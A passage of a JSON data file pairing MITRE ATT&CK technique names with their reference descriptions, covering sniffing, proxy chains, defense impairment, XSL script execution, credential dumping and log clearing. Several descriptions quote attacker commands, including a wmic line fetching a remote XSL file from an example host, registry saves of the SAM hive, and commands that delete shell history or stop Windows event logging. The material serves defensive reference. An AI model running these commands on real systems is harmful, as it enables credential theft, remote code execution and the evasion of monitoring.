    "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring) (Citation: GCP Packet Mirroring) (Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) (Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic. (Citation: Rhino Security Labs AWS VPC Traffic Mirroring)"
  ],
  "proxy: multi-hop proxy": [
    "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s WAN. Protocols such as ICMP may be used as a transport."
  ],
  "impair defenses: safe mode boot": [
    "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)"
  ],
  "acquire infrastructure: server": [
    "Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations.\n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)"
  ],
  "xsl script processing": [
    "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>"
  ],
  "email collection: remote email collection": [
    "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords."
  ],
  "compromise client software binary": [
    "Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host."
  ],
  "scheduled transfer": [
    "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)."
  ],
  "os credential dumping: lsa secrets": [
    "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)"
  ],
  "permission groups discovery: local groups": [
    "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups."
  ],
  "archive collected data: archive via custom method": [
    "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)"
  ],
  "compromise infrastructure: domains": [
    "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)"
  ],
  "dynamic resolution: domain generation algorithms": [
    "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)"
  ],
  "impair defenses": [
    "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components."
  ],
  "masquerading: invalid code signature": [
    "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\n\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature."
  ],
  "masquerading: rename system utilities": [
    "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>). (Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)"
  ],
  "command and scripting interpreter: unix shell": [
    "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence."
  ],
  "indicator removal on host: clear command history": [
    "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)"
  ],
  "abuse elevation control mechanism": [
    "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system."
  ],
  "impair defenses: disable windows event logging": [
    "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind."
  ],
  "compromise infrastructure: server": [
    "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)."
  ],
  "create account: local account": [
    "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
  ],
  "application layer protocol: mail protocols": [
    "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
  ],
  "data obfuscation: protocol impersonation": [
    "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. "
  ],
  "input capture: gui input capture": [
    "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) "
  ],
  "browser bookmark discovery": [
    "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases."
  ],
  "protocol tunneling": [
    "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. "
  ],
  "active scanning: vulnerability scanning": [
    "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190))."
  ],
  "event triggered execution: windows management instrumentation event subscription": [
    "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges."
  ],
  "data staged: remote data staging": [
    "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection."
  ],
  "os credential dumping: security account manager": [
    "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n"
  ],
  "steal web session cookie": [
    "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application."
  ],
  "system network configuration discovery: internet connection discovery": [
    "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers."
  ],
  "server software component: sql stored procedures": [
    "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) "
  ],
  "data manipulation: runtime data manipulation": [
    "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
  ],
  "adversary-in-the-middle": [
    "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498)."
  ],
  "impair defenses: indicator blocking": [
    "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck)."
  ],
  "valid accounts: default accounts": [
